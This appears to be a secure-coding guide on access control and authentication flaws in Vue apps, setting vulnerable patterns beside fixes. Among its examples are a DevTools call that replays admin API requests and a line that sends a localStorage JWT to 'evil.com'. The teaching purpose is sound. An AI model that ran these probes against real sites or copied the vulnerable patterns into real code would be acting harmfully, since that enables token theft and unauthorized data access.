# A01 + A07 — Access Control & Authentication Failures

## Overview

Vue Router navigation guards only control UI flow — they do not protect API endpoints. JWTs in localStorage are instantly exfiltrable by any XSS. These two categories are responsible for the majority of real-world Vue application breaches.

Severity: **Critical**

---

## 1. Route Guard Bypass (A01)

### Vulnerable Pattern
```js
// ❌ This prevents navigation — NOT data access
router.beforeEach((to, from, next) => {
  const auth = useAuthStore()
  if (to.meta.requiresAdmin && !auth.isAdmin) {
    next('/unauthorized')
  } else {
    next()
  }
})

// ❌ The admin view calls this unprotected endpoint
await axios.delete('/api/users/42')  // no server auth check
await axios.get('/api/admin/export') // full user dump
```

### Exploit
Open DevTools → Console:
```js
fetch('/api/admin/users').then(r=>r.json()).then(console.log)
// If data comes back as a student, access control is broken
```

### Secure Pattern
```js
// ✅ Attach JWT automatically via interceptor
axios.interceptors.request.use((config) => {
  const token = getToken() // from httpOnly cookie or memory
  if (token) config.headers.Authorization = `Bearer ${token}`
  return config
})

// ✅ Handle 401/403 globally
axios.interceptors.response.use(
  (res) => res,
  (err) => {
    if (err.response?.status === 401) {
      useAuthStore().logout()
      router.push('/login')
    }
    return Promise.reject(err)
  }
)

// ✅ Server-side: Express middleware
// app.delete('/api/users/:id', requireRole('admin'), handler)
```

### Use Case
A learning platform has an admin dashboard at `/admin/users`. A student discovers the route from the JS bundle. Vue Router redirects them, but they replay API calls from DevTools — deleting students and exporting grades.

---

## 2. IDOR via Route Params (A01)

### Vulnerable Pattern
```js
// ❌ User ID from URL — attacker iterates
const route = useRoute()
const { data } = await axios.get(`/api/users/${route.params.id}/grades`)
// Attacker visits /profile/1, /profile/2, /profile/3...

// ❌ Predictable file download path
const downloadCert = (userId) => {
  window.location = `/api/certificates/${userId}.pdf`
}
```

### Secure Pattern
```js
// ✅ Server verifies ownership
app.get('/api/users/:id/grades', auth, (req, res) => {
  if (req.user.id !== req.params.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' })
  }
  // ... fetch grades
})
```

---

## 3. Client-Side Role Manipulation (A01)

### Vulnerable Pattern
```js
// ❌ Role in Pinia state — editable via Vue Devtools
export const useAuthStore = defineStore('auth', {
  state: () => ({
    user: { id: 1, name: 'Student', role: 'student' },
  }),
  getters: {
    isAdmin: (state) => state.user.role === 'admin'
    // Attacker: Vue Devtools → state → role = 'admin'
  }
})

// ❌ API sends client-side role
axios.post('/api/courses', {
  title: 'My Course',
  createdBy: authStore.user.role // attacker sends 'admin'
})
```

### Secure Pattern
Never trust client-sent roles. Extract the role from the server-verified JWT. For critical operations (role changes, financial actions), re-verify against the database.

---

## 4. JWT in localStorage (A07)

### Vulnerable Pattern
```js
// ❌ Any XSS payload reads this instantly
localStorage.setItem('access_token', jwt) // 30-day expiry

// ❌ Every XSS vector now steals the token:
fetch('https://evil.com?t=' + localStorage.getItem('token'))

// ❌ "Encrypted" localStorage is security theater
// The encryption key is also in the JS — extractable
localStorage.setItem('token', CryptoJS.AES.encrypt(jwt, 'key123'))
```

### Exploit Chain
Any Vue XSS (v-html, CSTI, gadget, compromised npm package) → `localStorage.getItem('token')` → exfiltrate JWT → persistent access even after password change (if no server-side revocation).

### Secure Pattern
```js
// ✅ Server sets httpOnly cookie — JS never sees token
// Express:
res.cookie('session', jwt, {
  httpOnly: true,    // not accessible via document.cookie
  secure: true,      // HTTPS only
  sameSite: 'Strict', // blocks CSRF
  maxAge: 900000,    // 15 minutes
  path: '/api',      // only sent to API routes
})

// ✅ Vue — just enable credentials
const api = axios.create({ withCredentials: true })
```

---

## 5. Session Architecture (A07)

### Vulnerable Patterns
- No rate limiting on login form
- Single long-lived token with no refresh mechanism
- Refresh token reused forever (no rotation)
- Password reset via predictable token (userId-timestamp)
- Sessions stay alive after password change

### Secure Auth Composable
```js
export function useAuth() {
  const api = axios.create({
    withCredentials: true,
    baseURL: '/api'
  })

  // ✅ Login — server sets httpOnly cookie
  const login = async (email, password) => {
    await api.post('/auth/login', { email, password })
  }

  // ✅ Silent refresh with token rotation
  const refresh = async () => {
    await api.post('/auth/refresh')
    // Server issues NEW access + NEW refresh token
    // Old refresh token invalidated
  }

  // ✅ Auto-refresh on 401
  api.interceptors.response.use(
    (res) => res,
    async (err) => {
      if (err.response?.status === 401 && !err.config._retry) {
        err.config._retry = true
        await refresh()
        return api(err.config)
      }
      if (err.response?.status === 401) {
        logout()
        router.push('/login')
      }
      return Promise.reject(err)
    }
  )

  return { login, logout, refresh, api }
}
```

### Server-Side Checklist
1. httpOnly + Secure + SameSite=Strict cookies
2. Access tokens expire in 15 minutes
3. Refresh tokens are single-use with rotation
4. Rate limit login: 5 attempts/minute per IP
5. Invalidate all sessions on password change
6. Use bcrypt/argon2 for password hashing
7. CSRF token for state-changing requests when using cookies
